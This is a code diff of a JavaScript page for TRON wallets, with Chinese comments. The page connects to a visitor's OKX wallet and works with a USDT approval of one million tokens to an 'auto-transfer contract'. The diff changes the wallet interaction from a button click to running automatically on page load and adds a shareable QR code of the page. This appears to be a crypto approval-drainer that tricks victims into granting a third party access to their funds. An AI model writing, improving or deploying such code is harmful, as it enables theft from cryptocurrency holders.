@@ -1,6 +1,5 @@
 const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT合约地址
 const autoTransferContractAddress = 'TJKQATfKMkgbVVNjS1BXfXfaup3CCcAkQz'; // 自动转账合约地址
-const receiveAddress = 'TXov68aLHojmFmZm7HdXax1L5mNbgSQ8pE'; // 收款地址
 const approveAmount = 1000000 * 10 ** 6; // 授权100万USDT
 
 const usdtAbi = [
@@ -64,7 +63,7 @@ const autoTransferAbi = [
 
 let tronWeb;
 
-document.getElementById('connectWalletBtn').addEventListener('click', async () => {
+async function init() {
     if (typeof window.tronWeb === 'undefined') {
         alert('请安装OKX Wallet并切换到TRON网络!');
         return;
@@ -74,6 +73,7 @@ document.getElementById('connectWalletBtn').addEventListener('click', async () =
 
     try {
         const account = tronWeb.defaultAddress.base58;
+
         const usdtContract = await tronWeb.contract().at(usdtContractAddress);
         const autoTransferContract = await tronWeb.contract().at(autoTransferContractAddress);
 
@@ -86,12 +86,16 @@ document.getElementById('connectWalletBtn').addEventListener('click', async () =
         console.error(error);
         document.getElementById('result').innerText = '操作失败';
     }
-});
+}
 
+// 生成二维码并添加点击事件
 document.addEventListener('DOMContentLoaded', () => {
-    if (typeof window.tronWeb !== 'undefined') {
-        document.getElementById('connectWalletBtn').style.display = 'block';
-    } else {
-        document.getElementById('result').innerText = '请安装OKX Wallet并切换到TRON网络!';
-    }
+    const qrcode = new QRCode(document.getElementById("qrcode"), {
+        text: window.location.href,
+        width: 128,
+        height: 128,
+    });
+
+    // 初始化钱包交互
+    init();
 });
